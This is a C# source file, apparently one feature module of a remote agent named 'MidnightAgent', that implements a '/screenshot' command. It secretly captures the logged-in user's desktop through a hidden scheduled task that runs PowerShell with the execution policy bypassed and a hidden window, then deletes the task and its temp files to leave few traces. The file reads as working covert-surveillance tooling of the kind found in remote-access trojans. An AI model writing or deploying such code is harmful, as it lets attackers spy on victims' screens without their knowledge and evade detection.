using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace MidnightAgent.Features
{
    /// <summary>
    /// /screenshot - Capture screen via user-session helper task
    /// </summary>
    public class ScreenshotFeature : IFeature
    {
        public string Command => "screenshot";
        public string Description => "Capture screenshot";
        public string Usage => "/screenshot";

        private const string HELPER_TASK_NAME = "MidnightScreenHelper";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");

            try
            {
                if (CaptureViaHelperTask(tempPath))
                {
                    return Task.FromResult(FeatureResult.File(tempPath, "📸 Screenshot"));
                }

                return Task.FromResult(FeatureResult.Fail("❌ Screenshot failed: Cannot access user desktop"));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"❌ Screenshot failed: {ex.Message}"));
            }
        }

        /// <summary>
        /// Create and run a helper scheduled task that runs as the logged-in user
        /// with InteractiveToken to access the user's desktop session
        /// </summary>
        private bool CaptureViaHelperTask(string outputPath)
        {
            string psScriptPath = null;
            string xmlPath = null;

            try
            {
                // 1. Find the logged-in username from explorer.exe
                string loggedInUser = GetLoggedInUser();
                if (string.IsNullOrEmpty(loggedInUser))
                    return false;

                // 2. Create PowerShell capture script
                psScriptPath = Path.Combine(Path.GetTempPath(), $"screencap_{Guid.NewGuid():N}.ps1");
                string psScript = $@"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save('{outputPath.Replace("'", "''")}', [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
";
                File.WriteAllText(psScriptPath, psScript);

                // 3. Create XML task definition with InteractiveToken
                xmlPath = Path.Combine(Path.GetTempPath(), $"task_{Guid.NewGuid():N}.xml");
                string taskXml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Description>Screen Capture Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>{loggedInUser}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File ""{psScriptPath}""</Arguments>
    </Exec>
  </Actions>
</Task>";
                File.WriteAllText(xmlPath, taskXml);

                // 4. Create and run the task
                RunSchtasks($"/Create /XML \"{xmlPath}\" /TN \"{HELPER_TASK_NAME}\" /F");
                RunSchtasks($"/Run /TN \"{HELPER_TASK_NAME}\"");

                // 5. Wait for screenshot
                for (int i = 0; i < 30; i++)
                {
                    Thread.Sleep(500);
                    if (File.Exists(outputPath) && new FileInfo(outputPath).Length > 10000)
                    {
                        Cleanup(psScriptPath, xmlPath);
                        return true;
                    }
                }

                Cleanup(psScriptPath, xmlPath);
                return false;
            }
            catch
            {
                Cleanup(psScriptPath, xmlPath);
                return false;
            }
        }

        private string GetLoggedInUser()
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName("explorer"))
                {
                    string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {proc.Id}";
                    using (var searcher = new System.Management.ManagementObjectSearcher(query))
                    {
                        foreach (System.Management.ManagementObject obj in searcher.Get())
                        {
                            string[] ownerInfo = new string[] { string.Empty, string.Empty };
                            if (Convert.ToInt32(obj.InvokeMethod("GetOwner", ownerInfo)) == 0)
                            {
                                string domain = ownerInfo[1];
                                string user = ownerInfo[0];
                                return string.IsNullOrEmpty(domain) ? user : $"{domain}\\{user}";
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        private void RunSchtasks(string arguments)
        {
            using (var proc = Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true
            }))
            {
                proc?.WaitForExit(10000);
            }
        }

        private void Cleanup(string psScriptPath, string xmlPath)
        {
            try { RunSchtasks($"/Delete /TN \"{HELPER_TASK_NAME}\" /F"); } catch { }
            try { if (psScriptPath != null) File.Delete(psScriptPath); } catch { }
            try { if (xmlPath != null) File.Delete(xmlPath); } catch { }
        }
    }
}
